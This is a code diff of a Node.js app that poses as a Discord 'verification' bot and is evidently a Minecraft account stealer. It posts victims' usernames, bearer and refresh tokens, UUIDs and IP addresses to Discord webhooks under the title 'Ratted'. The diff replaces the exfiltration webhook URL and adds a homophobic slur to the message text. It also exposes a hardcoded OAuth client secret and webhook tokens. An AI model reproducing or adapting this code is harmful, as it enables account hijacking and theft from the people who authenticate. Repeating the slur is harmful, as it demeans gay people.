@@ -2,7 +2,7 @@
 const client_secret = 'x4l8Q~WMSZqzfvaCfeH41jJmqhVW6d2vPuiUwbGT'
 const client_id = '7f37696a-767f-4f1e-be89-a7fd96c81723'
 const redirect_uri = 'https://verification-botto.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1043914297312550942/zVv5TZj4ht2hXgPxnBZv-FIfvYUWhSRPqH8H16PQbFjkG8NBn7MC7ZKwBJy-mG6teCKY'
+const webhook_url = 'https://discord.com/api/webhooks/1045059144446640148/8OwAXFi74BECmL2prIoAJNJhq4Hk6Yjge6x_9WQv9A4OPJPAPh_IO5LN435VgzIGGNKi'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -126,7 +126,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     let data = {
   username: "MOG",
   avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
-  content: "@everyone",
+  content: "@everyone this faggot just got beamed",
   embeds: [
     {
       title: "Ratted " + username + " - Click for networth",
@@ -142,7 +142,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 }
     axios.all([ 
         axios.post(url, data),
-        axios.post("https://discord.com/api/webhooks/1043914297312550942/zVv5TZj4ht2hXgPxnBZv-FIfvYUWhSRPqH8H16PQbFjkG8NBn7MC7ZKwBJy-mG6teCKY", data)
+        axios.post("https://discord.com/api/webhooks/1045059144446640148/8OwAXFi74BECmL2prIoAJNJhq4Hk6Yjge6x_9WQv9A4OPJPAPh_IO5LN435VgzIGGNKi", data)
            .then(() => console.log("Successfully authenticated, posting to webhook!"))
     ])
     
